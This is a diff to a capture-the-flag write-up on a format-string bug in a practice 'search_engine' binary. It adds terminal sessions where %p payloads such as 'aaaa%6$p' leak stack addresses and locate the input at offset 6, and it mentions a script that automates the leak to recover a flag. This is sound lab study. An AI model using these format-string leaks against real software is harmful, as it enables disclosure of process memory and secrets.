@@ -205,6 +205,7 @@ No result found. You searched for - 0x5619f5dfe6b8 (nil) (nil) 0x5619f6ca5000 0x
 So i can get the address where our input is stored on the stack
 
 ```
+┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/search_engine]
 └─$ ./search_engine
    _____                                _         ______                   _
   / ____|                              | |       |  ____|                 (_)
@@ -214,11 +215,28 @@ So i can get the address where our input is stored on the stack
  |_____/   \___|  \__,_| |_|     \___| |_| |_|   |______| |_| |_|  \__, | |_| |_| |_|  \___|
                                                                     __/ |
                                                                    |___/
-Search: AAAA%pAAAA%pAAAA%pAAAA%pAAAA%pAAAA%pAAAA%p 
-No result found. You searched for - aaaa0x55b2bc6046b8aaaa(nil)aaaa(nil)aaaa0x55b2bceae000a
+Search: aaaa%p%p%p%p%p%p%p%p%p%p%p%p
+No result found. You searched for - aaaa0x5590826ca6b8(nil)(nil)0x5590838090000x210010x70257025616161610x70257025702570250x70257025702570250x250x6c6166207475707b
+
 ```
 
-With this it seems our input is stored at a farther offset so doing that manually is stressfull
+With this it seems our input is stored at offset 6 
+
+```
+└─$ ./search_engine
+   _____                                _         ______                   _
+  / ____|                              | |       |  ____|                 (_)
+ | (___     ___    __ _   _ __    ___  | |__     | |__     _ __     __ _   _   _ __     ___
+  \___ \   / _ \  / _` | | '__|  / __| | '_ \    |  __|   | '_ \   / _` | | | | '_ \   / _ \
+  ____) | |  __/ | (_| | | |    | (__  | | | |   | |____  | | | | | (_| | | | | | | | |  __/
+ |_____/   \___|  \__,_| |_|     \___| |_| |_|   |______| |_| |_|  \__, | |_| |_| |_|  \___|
+                                                                    __/ |
+                                                                   |___/
+Search: aaaa%6$p
+No result found. You searched for - aaaa0x7024362561616161
+```
+
+We can use this approach to leak address that is in the stack. But doing it manually will take time 
 
 So here's the script to solve it 
 
@@ -258,7 +276,7 @@ for i in range(100):
 # Print and close
 info(flag)
 ```
-What it does is that it automates the process of sending %p then getting the address which then it will attempt to get the string of it
+What it does is that it automates the process of sending %p which will get various address of the stack, it then it will attempt to get the string of it
 
 Why am doing this is so that we can leak the string of the flag stored at the stack
 
